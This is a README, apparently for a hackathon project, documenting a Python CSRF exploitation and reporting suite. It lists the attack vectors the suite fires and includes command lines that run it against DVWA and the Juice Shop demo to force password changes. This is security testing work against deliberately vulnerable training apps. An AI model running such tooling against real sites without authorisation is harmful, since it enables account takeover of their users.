# 📖 README.md (Full Version)

```markdown
# WebSentinel+ CSRF Attack Suite

## 🚀 Overview
This project is part of our **Cybersecurity Hackathon (CTS NPN Recruitment)** submission.  
We implemented a **Cross-Site Request Forgery (CSRF) attack suite** that:

- Launches **all major CSRF attack vectors** (not just one).
- Works on **cookie-based apps (like DVWA)** and **modern JWT/header-based apps (like Juice Shop)**.
- Auto-generates **timestamped JSON + HTML reports** with exploited vectors, status codes, and cURL reproduction commands.
- Distinguishes between **vulnerable apps (DVWA → ✅ exploited)** and **secure-by-design apps (JWT → Not applicable)**.

This is more than a scanner — it’s a **CSRF exploitation framework + reporting system**, built to impress both judges and enterprises.

---

## 🌟 Wow Factors
1. **Full attack simulation** → Fires img/script/iframe/meta/link/form/fetch/xhr/multipart/method-override/cookie-refresh vectors.
2. **Universal coverage** → Cookie sessions exploited, JWT/header auth correctly marked as “Not applicable.”
3. **Professional reporting** → HTML/JSON reports + cURL repro pack.
4. **Enterprise ready** → Timestamped logs, structured outputs, scalable design.

---

## 📂 Project Structure
```

websentinel-csrf/
├── auto\_run.py          # CLI wrapper to quickly run against any target
├── csrf\_suite\_cli.py    # Core engine: fires vectors, classifies results, writes reports
├── templates/           # (optional) HTML templates for reports
├── reports/             # Generated reports (HTML + JSON + curl.txt)
├── requirements.txt     # Python dependencies
└── README.md            # This file

````

---

## ⚙️ Installation

### 1. Clone Repo
```bash
git clone https://github.com/Nerangen/b-secure-cts.git
cd b-secure-cts
git checkout csrf
````

### 2. Install Dependencies

```bash
pip3 install -r requirements.txt
python3 -m playwright install chromium
```

---

## 🧩 Code Explanation

### `auto_run.py`

* Entry CLI for quick runs.
* Key arguments:

  * `--cookie` → single cookie (e.g., PHPSESSID).
  * `--cookies` → multiple cookies (`"PHPSESSID=...; security=low"`).
  * `--auth-header` → e.g. `Authorization: Bearer <JWT>`.
  * `--add-post` → one or more POST actions (`"URL key=val&key2=val2"`).
  * `--body-format` → `form` or `json`.
  * `--noreferrer` → enables noreferrer vector.
  * `--exploits-only` → creates a report with exploited vectors only.

---

### `csrf_suite_cli.py`

* Core engine that:

  * Builds & executes all CSRF payload vectors.
  * Captures request/response info.
  * Applies heuristics to classify vulnerabilities.
  * Writes **HTML + JSON reports** and **cURL repro commands**.

---

## 🧪 Running Steps

### 🔐 DVWA (Cookie-based, vulnerable)

1. Run DVWA on `http://localhost:8080`.
2. Login → Security Level = **Low**.
3. Copy `PHPSESSID` from DevTools → Application → Cookies.
4. Run:

```bash
set +H

python3 auto_run.py \
  --base http://localhost:8080 \
  --cookie "PHPSESSID=<PASTE>" \
  --cookies "security=low" \
  --add-post "http://localhost:8080/vulnerabilities/csrf/ password_new=pwned123!&password_conf=pwned123!&Change=Change" \
  --body-format form \
  --noreferrer \
  --exploits-only
```

✅ Expected: HTML report shows many **exploited vectors**.

---

### 🛡️ Juice Shop (JWT-based, secure)

1. Run `https://juice-shop.herokuapp.com`.
2. Login → DevTools → Network → copy `Authorization: Bearer <JWT>`.
3. Export JWT and current password:

```bash
export JWT='<paste-long-jwt>'
export CUR='<your-current-password>'
```

4. Run:

```bash
python3 auto_run.py \
  --base https://juice-shop.herokuapp.com \
  --auth-header "Authorization: Bearer $JWT" \
  --add-post "https://juice-shop.herokuapp.com/rest/user/change-password current=$CUR&new=Attacker123!&repeat=Attacker123!" \
  --body-format json \
  --noreferrer \
  --exploits-only
```

✅ Expected: Report shows **Not applicable (JWT/header-based auth)**.

---

## 📊 Reports

* Saved in `reports/` with timestamp + domain:

  * `localhost_csrf_2025-08-30_12-30-01.html`
  * `juice-shop.herokuapp.com_csrf_2025-08-30_12-35-44.json`
  * `juice-shop.herokuapp.com_csrf_2025-08-30_12-35-44_curl.txt`

### View in Browser

```bash
python3 -m http.server 8000 --directory reports
# open http://localhost:8000/
```

---

## 🛠️ What To Modify

* For **new targets**:

  * Use `--cookie` for cookie-based apps.
  * Use `--auth-header` for JWT/header-based apps.
  * Add one or more `--add-post` for vulnerable endpoints.
* Switch `--body-format` between `form` and `json` depending on API.
* Add multiple `--add-post` for multiple forms/APIs.

---

## 👥 Team Workflow

* Everyone should **clone** the repo:

```bash
git clone https://github.com/Nerangen/b-secure-cts.git
cd b-secure-cts
git checkout csrf
```

* Each teammate works in a branch:

```bash
git checkout -b xss-module
git push origin xss-module
```

* Later merge branches into `csrf` or `main`.

---

## 🏆 Hackathon Demo Flow

1. **DVWA run** → show exploited CSRF vectors (password changed).
2. **Juice Shop run** → show “Not applicable (JWT)” (secure by design).
3. Explain:

   * Our suite **detects & exploits real CSRF**.
   * It also **recognizes modern secure apps**, avoiding false positives.
   * Reports are **enterprise-ready** with JSON/HTML/cURL outputs.

---

````

---

## 📌 Push this README to GitHub

```bash
cd ~/websentinel-csrf
nano README.md   # paste the above content and save
git add README.md
git commit -m "Add full README with installation, usage, workflow, demo steps"
git push origin csrf
````
